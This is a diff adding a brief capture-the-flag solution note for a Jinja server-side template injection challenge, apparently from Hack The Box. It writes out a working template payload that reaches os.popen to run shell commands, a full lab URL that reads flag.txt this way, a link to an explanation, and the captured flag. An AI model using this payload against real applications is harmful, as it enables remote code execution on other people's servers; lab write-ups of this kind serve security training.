@@ -1,0 +1,10 @@
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read()}}
+Injection is show above
+
+Full link: 
+http://138.68.164.196:30250/%7B%7Bself.__init__.__globals__.__builtins__.__import__('os').popen('cat%20flag.txt').read()%7D%7D
+
+Explanation: https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/
+
+Flag: HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!} 
+
